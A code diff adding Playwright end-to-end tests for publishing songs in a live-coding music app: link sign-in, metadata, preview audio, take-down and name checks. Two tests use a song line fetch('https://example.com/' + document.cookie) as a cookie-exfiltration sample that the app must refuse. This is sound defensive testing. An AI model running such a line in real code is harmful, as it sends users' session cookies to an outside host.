@@ -111,3 +111,102 @@ test('a song with code that is more than music is not made ready for publishing'
     await open(page, 'setcpm(120/4)\n\ndrums: s("bd*4")\nfetch("https://example.com/" + document.cookie)\n')
     expect(await prepare(page)).toEqual({ ok: false, refused: { why: 'code', what: 'fetch is not something a song can use', line: 4 } })
 })
+
+const SYNTHS = 'setcpm(120/4)\n\nbass: note("c2 c3 c2 e2").s("sawtooth").lpf(600)\n\nlead: note("c4 e4 g4 e4").s("triangle")\n'
+const dialog = (page: Page) => page.getByTestId('publish')
+const someone = () => `ante+${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}@example.com`
+
+async function openPublish(page: Page) {
+    await page.getByTestId('song-name').click()
+    await page.getByTestId('song-menu').getByRole('button', { name: 'Publish', exact: true }).click()
+    await expect(dialog(page)).toBeVisible()
+}
+
+// Signing in the way it goes on one's own machine: the link is handed back, opened in another
+// page, and its button pressed there.
+async function signIn(page: Page, email = someone()) {
+    await dialog(page).getByLabel('Your name, as it stands beside your songs').fill('Ante')
+    await dialog(page).getByLabel('Your address').fill(email)
+    await dialog(page).getByRole('button', { name: 'Send me a link', exact: true }).click()
+    await expect(dialog(page)).toContainText(`A link is on its way to ${email}`)
+    const link = await page.getByTestId('publish-link').getAttribute('href')
+    const other = await page.context().newPage()
+    await other.goto(link!)
+    await expect(other.getByRole('heading', { name: 'Sign in to Weft' })).toBeVisible()
+    await other.getByRole('button', { name: 'Sign in', exact: true }).click()
+    await expect(other.getByRole('heading', { name: 'You are signed in' })).toBeVisible()
+    await other.close()
+    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
+}
+
+test('a song is published from the app: sign in with a link, say what it is, and it is on the site', async ({ page }) => {
+    await open(page, SYNTHS)
+    await openPublish(page)
+    await expect(dialog(page)).toContainText('You sign in with a link sent to your address')
+    await signIn(page)
+    await expect(page.getByTestId('publish-note')).toContainText('The song file is')
+
+    await dialog(page).getByPlaceholder("What people read on the song's page").fill('Two synths going round.')
+    await dialog(page).getByPlaceholder('One tag, in your own words').fill('test tone')
+    await dialog(page).getByRole('radio', { name: /CC0/ }).click()
+    await dialog(page).getByRole('button', { name: 'Publish', exact: true }).click()
+    await expect(dialog(page)).toContainText('Untitled is published.', { timeout: 40000 })
+    const address = (await dialog(page).locator('.pb-url').textContent())!.trim()
+    expect(address).toMatch(/^http:\/\/127\.0\.0\.1:5191\/songs\/[a-z0-9]+$/)
+
+    const file = await page.request.get(`${address}.weft`)
+    expect(JSON.parse(await file.text())).toMatchObject({ weft: 1, name: 'Untitled', code: SYNTHS, sounds: [] })
+    const preview = await page.request.get(`${address}.mp3`)
+    expect(preview.headers()['content-type']).toBe('audio/mpeg')
+    const bytes = (await preview.body()).length
+    expect(bytes).toBeGreaterThan(200 * 1024)
+    expect(bytes).toBeLessThan(700 * 1024)
+    const songPage = await page.context().newPage()
+    await songPage.goto(address)
+    await expect(songPage.getByRole('heading', { name: 'Untitled' })).toBeVisible()
+    await expect(songPage.locator('body')).toContainText('by Ante')
+    await expect(songPage.locator('body')).toContainText('Two synths going round.')
+    await expect(songPage.locator('body')).toContainText('test tone, 120 bpm, 2 patterns, CC0')
+    await songPage.close()
+
+    await dialog(page).getByRole('button', { name: 'Close', exact: true }).click()
+    await openPublish(page)
+    await expect(page.getByTestId('publish-count')).toHaveText('You have used 1 of your 10 songs.')
+    const mine = page.getByTestId('publish-mine')
+    await expect(mine).toContainText('Untitled')
+    await mine.getByRole('button', { name: 'Take down', exact: true }).click()
+    await mine.getByRole('button', { name: 'Yes, take Untitled down', exact: true }).click()
+    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
+    expect((await page.request.get(address)).status()).toBe(404)
+
+    await dialog(page).getByRole('button', { name: 'Sign out', exact: true }).click()
+    await expect(dialog(page).getByLabel('Your address')).toBeVisible()
+})
+
+test('a song with code that is more than music cannot be published from the app', async ({ page }) => {
+    await open(page, `${SYNTHS}fetch("https://example.com/" + document.cookie)\n`)
+    await openPublish(page)
+    await signIn(page)
+    const refused = page.getByTestId('publish-refused')
+    await expect(refused).toContainText('This song cannot be published')
+    await expect(refused).toContainText('Line 6: fetch is not something a song can use. A song may hold only music code')
+    await expect(dialog(page).getByRole('button', { name: 'Publish', exact: true })).toBeDisabled()
+})
+
+test('the half minute people hear starts where most of the song plays for all of it, and can be moved', async ({ page }) => {
+    await open(page, 'setcpm(120/4)\n\nbass: note("c2").s("sawtooth").mask("<0!4 1!28>")\n\nlead: note("c4").s("triangle").mask("<0!8 1!16 0!8>")\n\nhigh: note("c5").s("sine").mask("<0!30 1!2>")\n')
+    await openPublish(page)
+    await signIn(page)
+    await expect(page.getByTestId('publish-from')).toHaveText('9')
+    await dialog(page).getByRole('button', { name: 'An earlier bar', exact: true }).click()
+    await expect(page.getByTestId('publish-from')).toHaveText('8')
+})
+
+test('a name is asked for before a link is sent, and stands beside the song', async ({ page }) => {
+    await open(page, SYNTHS)
+    await openPublish(page)
+    await dialog(page).getByLabel('Your address').fill(someone())
+    await dialog(page).getByRole('button', { name: 'Send me a link', exact: true }).click()
+    await expect(page.getByTestId('publish-note')).toHaveText('Type the name that should stand beside your songs.')
+    await expect(dialog(page).getByLabel('Your address')).toBeVisible()
+})
